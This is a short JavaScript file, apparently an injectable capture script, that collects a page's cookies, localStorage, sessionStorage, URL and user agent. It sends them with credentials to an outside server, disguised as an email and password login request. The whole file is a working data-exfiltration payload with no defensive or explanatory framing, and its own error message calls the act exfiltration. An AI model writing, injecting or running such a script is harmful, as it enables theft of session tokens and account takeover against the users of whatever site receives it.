(function () {
  const data = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    location: window.location.href,
    userAgent: navigator.userAgent
  };

  fetch('https://zaza-back.onrender.com/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include',
    body: JSON.stringify({
      email: 'from-capture.js',
      password: 'injected',
      cookies: JSON.stringify(data)
    })
  }).catch(err => console.error('Exfiltration failed:', err));
})();
